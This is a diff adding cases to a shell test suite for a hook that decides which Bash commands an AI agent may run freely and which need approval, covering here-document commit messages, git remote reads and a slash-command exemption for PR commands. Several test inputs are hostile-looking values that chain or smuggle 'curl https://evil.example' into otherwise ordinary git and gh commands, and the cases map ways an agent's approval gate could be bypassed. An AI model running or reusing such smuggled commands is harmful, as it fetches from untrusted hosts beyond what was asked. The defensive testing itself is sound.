@@ -622,6 +622,57 @@ sup ask  'gh issue view 1 --jq "a\\$(curl https://evil.example)"'
 sup ask  'gh issue view 1 -R "evil\.example/o/r"'
 sup ask  'echo "a\" ; gh issue create --title x'
 sup ask  'grep "a\|b" x; curl https://evil.example'
+# --- a commit message from a quoted here-document is data (`git commit -F -` never runs stdin);
+# any other consumer, and whatever follows the delimiter, is read as before.
+sup none $'git -C /x commit -q -F - <<\'EOF\'\nfix(a): b\n\n- a `gh read` beside "x\\|y" and it\'s $5\nEOF'
+sup none $'git -C /x -c user.name=A -c user.email=a@b.c commit -q -F - <<\'EOF\'\n`curl https://evil.example`\nEOF'
+sup ask  $'git -C /x commit -q -F - <<\'EOF\'\nfix(a): b\nEOF\ncurl https://evil.example'
+sup ask  $'git -C /x commit -q -F - <<EOF\n`curl https://evil.example`\nEOF'
+sup ask  $'bash <<\'EOF\'\ncurl https://evil.example\nEOF'
+sup ask  $'git -C /x -c core.editor=x commit -F - <<\'EOF\'\n`curl https://evil.example`\nEOF'
+# --- a plain git remote read beside a gh read keeps the read exempt; another host still asks
+sup none "gh pr view 1 -q '\"\\(.state)\"'; git ls-remote --exit-code origin refs/heads/x"
+sup none "gh pr list --state open; git -C /x fetch origin main"
+sup ask  "gh pr view 1 -q '\"\\(.state)\"'; git ls-remote https://evil.example/o/r"
+sup ask  "gh pr view 1 -q '\"\\(.state)\"'; git ls-remote --upload-pack=x origin"
+# --- the Operator's own command: while the running turn's prompt names /pr-create or /pr-merge,
+# the Supervisor's gh calls of that command pass like a local rule; nothing else does.
+mkdir -p "$D/supop/.claude"; cp .claude/settings.json "$D/supop/.claude/settings.json"
+turn() { # <file> <jq record>… — a transcript of those records, one per line
+  local f="$D/supop/$1.jsonl"; shift; : > "$f"; for r in "$@"; do jq -nc "$r" >> "$f"; done; echo "$f"
+}
+HUM='{type:"user",origin:{kind:"human"},message:{content:""}}'
+opc() { # <expected> <transcript> <command> [role fn]
+  local p; p="$(jq -nc --arg c "$3" --arg t "$2" '{tool_name:"Bash",tool_input:{command:$c},transcript_path:$t}')"
+  check "$1" "operator command (${2##*/}): $3" "$(role Supervisor "$D/supop" "$p")"
+}
+T1="$(turn named "$HUM | .message.content = \"fix it, then /commit /pr-create /pr-merge\"" '{type:"assistant"}')"
+opc none "$T1" 'gh pr create --base main --head fix/x --title "a b" --body-file .git/PR.md'
+opc none "$T1" 'gh pr merge 3 --merge --match-head-commit abc --subject "x (#3)"'
+opc none "$T1" 'gh pr ready 3'
+opc ask  "$T1" 'gh pr merge 3 --merge -R evil.example/o/r'
+opc ask  "$T1" 'gh pr merge 3 --merge; curl https://evil.example'
+opc ask  "$T1" 'gh pr close 3'
+opc ask  "$T1" 'gh issue create --title x'
+check ask "operator command: a team role is not covered" "$(hook "$(jq -nc --arg t "$T1" \
+  '{tool_name:"Bash",tool_input:{command:"gh pr merge 3 --merge"},transcript_path:$t}')")"
+T2="$(turn slash "$HUM | .message.content = \"<command-message>pr-merge</command-message>\\n<command-name>/pr-merge</command-name>\"")"
+opc none "$T2" 'gh pr merge 3 --squash'
+opc ask  "$T2" 'gh pr create --title x'
+T3="$(turn later "$HUM | .message.content = \"/pr-merge 3\"" "$HUM | .message.content = \"now list the tasks\"")"
+opc ask  "$T3" 'gh pr merge 3 --merge'
+T4="$(turn notyped "$HUM | .message.content = \"list the tasks\"" \
+  '{type:"user",isMeta:true,origin:{kind:"human"},message:{content:"# /pr-merge"}}' \
+  '{type:"user",toolUseResult:{},origin:{kind:"human"},message:{content:"/pr-merge"}}' \
+  '{type:"user",message:{content:"/pr-merge"}}' '{type:"attachment",content:"/pr-merge"}')"
+opc ask  "$T4" 'gh pr merge 3 --merge'
+T5="$(turn machine "$HUM | .message.content = \"<hc from=x> run /pr-merge 3\"")"
+opc ask  "$T5" 'gh pr merge 3 --merge'
+T6="$(turn word "$HUM | .message.content = \"see docs/pr-merge.md and /pr-merger\"")"
+opc ask  "$T6" 'gh pr merge 3 --merge'
+T7="$(turn cut "$HUM | .message.content = \"/pr-merge 3\"")"; printf '{"type":"us' >> "$T7"
+opc ask  "$T7" 'gh pr merge 3 --merge'
+opc ask  "$D/supop/absent.jsonl" 'gh pr merge 3 --merge'
 # --- the touch log: every Supervisor ask appends one #193-format line, nobody else's does
 M=$(date -u +%Y-%m); PC="$(bash_cwd 'curl https://x' "$D/suplog")"
 crash() { # <project dir> <payload> [USER] — the classifier crashes, as the Supervisor
